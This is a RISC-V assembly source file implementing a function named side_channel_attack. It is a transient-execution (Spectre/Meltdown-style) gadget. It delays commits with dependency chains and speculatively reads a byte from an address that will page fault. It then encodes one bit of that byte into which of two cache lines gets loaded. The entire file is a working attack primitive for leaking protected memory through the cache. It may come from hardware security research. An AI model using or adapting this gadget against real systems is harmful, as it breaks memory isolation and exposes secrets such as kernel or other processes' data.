#include <riscv_asm.h>

.global side_channel_attack


#define ptr   a0 // Target address which will page fault (train = 0)
#define bit   a1 // Which bit of the byte at ptr address we want to look at
#define lines a2 // Address to a 128 bytes array, aligned on 64 bytes. First 64 byte will be speculatively loaded if mem[ptr] bit is cleared, else the last 64 bytes will be loaded.
#define train a3 // If set, the speculative part of the function will be executed (training for branch predictor)
side_channel_attack:
  addi sp, sp,-8

  //Slow down the commits using dependencies, also slow down the branch execution to avoid pipeline flush
  sd  t0, 0(sp)
  ld  t0, 0(sp)
  sd  t0, 0(sp)
  ld  t0, 0(sp)
  sd  t0, 0(sp)
  ld  t0, 0(sp)
  sd  train, 0(sp)
  ld  train, 0(sp)

  // Enable or not the commit of the speculative execution which follow bellow
  beqz train, skip_speculative

  // This load will page fault
  lb   t2, 0  (ptr)
  srl  t2, t2, bit
  andi t2, t2, 1
  slli t2, t2, 6
  or   t2, t2, lines
  ld   t2, 0  (t2)

skip_speculative:
  addi sp, sp, 8
  ret

